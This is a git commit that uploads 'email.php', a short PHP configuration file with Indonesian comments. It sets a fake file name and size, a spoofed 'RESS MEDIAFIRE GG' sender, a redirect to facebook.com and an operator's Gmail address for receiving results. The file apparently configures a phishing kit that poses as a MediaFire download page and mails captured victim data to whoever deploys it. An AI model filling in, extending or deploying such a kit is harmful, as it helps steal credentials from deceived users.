584c7ba136d0753f102f01e5544cefd78fb9c79a
hendar-xd <117215859+hendar-xd@users.noreply.github.com>
2022-11-02 12:04:47 +0700

    Add files via upload

---
+++ email.php
@@ -0,0 +1,13 @@
+<?php
+
+$linkweb = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
+$link = 'https://facebook.com'; //GANTI APA SAJA
+$namafile = 'GANTI NAMA FILE'; //JANGAN DIJUAL AJG
+$ukuranfile = '1000.3MB'; //KB MB GB TB GANTI UKURAN FILE
+
+$sender = 'From: RESS MEDIAFIRE GG <ahmadgans@xx.com>';
+$emailku = '08bocilll@gmail.com'; //GANTI EMAILMU DI SINI
+
+
+
+?>
